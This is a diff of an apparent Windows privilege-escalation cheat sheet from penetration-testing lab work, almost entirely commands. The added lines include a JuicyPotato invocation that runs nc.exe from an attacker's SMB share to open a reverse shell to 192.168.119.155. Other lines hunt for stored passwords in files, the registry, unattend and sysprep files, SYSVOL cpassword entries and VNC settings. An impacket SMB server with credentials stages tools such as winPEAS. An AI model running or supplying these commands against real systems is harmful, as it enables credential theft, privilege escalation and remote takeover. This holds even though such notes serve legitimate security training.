@@ -1,14 +1,21 @@
 ================================== 
 whoami
+whoami /priv
+
+SeRestorePrivilege = Enable-System32-Utilman-RDP
+SeImpersonatePrivilege = juicypotato/printspoof
+# \\192.168.119.155\share\juicy.exe -l 4444 -p c:\windows\system32\cmd.exe -a "/c  \\192.168.119.155\share\nc.exe -e cmd.exe 192.168.119.155 4447" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} 
+
+================================== 
 hostname                    
 echo %username% 
 net users 
 net user mike 
 net user Administrator 
 net group "Domain Admins" 
-whoami /priv                         ..impersonate=juicy/printspoof
-reg query HKLM /f pass /t REG_SZ /s  ..pw search
-echo %path%                          ..could lead to dll hijack
+reg query HKLM /f pass /t REG_SZ /s
+echo %path%      ..maybe dll hijack
+cmdkey /list
 
 ================================== 
 Files
@@ -24,10 +31,6 @@ cd C:\$Recycle.Bin & dir /a
 type c:\Windows\win.ini   
 type c:\Windows\System32\drivers\etc\hosts  
 type c:\Windows\System32\License.rtf 
-dir /a C:\inetpub\
-dir /s web.config
-
-cmdkey /list          ..quick check
 
 
 ================================== 
@@ -53,17 +56,47 @@ netstat -pantu
 netstat -nat | findstr LISTEN  
 route print 
  
- 
- 
+================================== 
+Web Hunt
+
+dir /a C:\inetpub\
+dir /b /s web.config
+
 ================================== 
 Cred Hunt
- 
+
+search -f *pass* 
+dir /b /s *pass* 
+dir /s *pass* == *cred* == *vnc* == *.config* 
+findstr /si password *.txt 
+findstr /si password *.xml 
+findstr /si password *.ini 
+findstr /spin "password" *.* 
+
+
+================================== 
+Sysprep
+
+dir /b /s *unattend* == *unattended* == *sysprep* == *groups.xml* 
+dir /b /s unattend.xml  
+dir /b /s Unattended.xml  
+dir /b /s web.config  
+dir /b /s sysprep.inf  
+dir /b /s sysprep.xml  
+dir /b /s Groups.xml
+
 type c:\sysprep.inf 
 type c:\sysprep\sysprep.xml 
 type c:\unattend.xml 
+type C:\Windows\System32\Unattend.xml 
+type C:\Windows\System32\sysprep\Unattend.xml 
+type C:\Windows\Panther\Unattend.xml 
+type C:\Windows\Panther\Unattend\Unattend.xml 
 type %WINDIR%\Panther\Unattend\Unattended.xml 
 type %WINDIR%\Panther\Unattended.xml 
- 
+
+findstr /S cpassword %LOGONSERVER%\sysvol\*.xml
+
 
 ================================== 
 Services 
@@ -165,7 +198,7 @@ dir /s "c:\Program Files (x86)"
 dir c:\*vnc.ini /s /b 
 dir c:\*ultravnc.ini /s /b  
 dir c:\ /s /b | findstr /si *vnc.ini 
-  
+
 reg query "HKCU\Software\ORL\WinVNC3\Password" 
 reg query "HKCU\Software\TightVNC\Server /v PasswordViewOnly"
 vncpwd.exe <pw found>
@@ -206,35 +239,12 @@ Keep a List:
 6. Windows Server 2016 Standard 14393 (6.3) 64 bit 
  
 
- 
-================================== 
-Search
- 
-findstr /si password *.txt 
-findstr /si password *.xml 
-findstr /si password *.ini 
-findstr /spin "password" *.* 
-search -f *pass* 
- 
-dir /s *pass* == *cred* == *vnc* == *.config* 
-
-c:\sysprep.inf  
-c:\sysprep\sysprep.xml  
-c:\unattend.xml  
-%WINDIR%\Panther\Unattend\Unattended.xml  
-%WINDIR%\Panther\Unattended.xml  
-dir /b /s unattend.xml  
-dir /b /s web.config  
-dir /b /s sysprep.inf  
-dir /b /s sysprep.xml  
-dir /b /s *pass*  
-  
 ================================== 
 Search Registry for Passwords
 
 reg query HKLM /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
- 
+
  
 ================================== 
 Autologon Creds 
@@ -320,8 +330,8 @@ rlwrap nc -nvlp 445
 TOOLS 
  
 cd ~\tools\privesc_windows
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
-net use \\192.168.49.124\share /USER:mike paxx  
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password helps  
+net use \\192.168.49.124\share /USER:mike helps  
 cd C:\Windows\Temp\
 cd C:\Users\Bob\Downloads\ 
 copy winPEASx64.exe \\192.168.49.124\share\
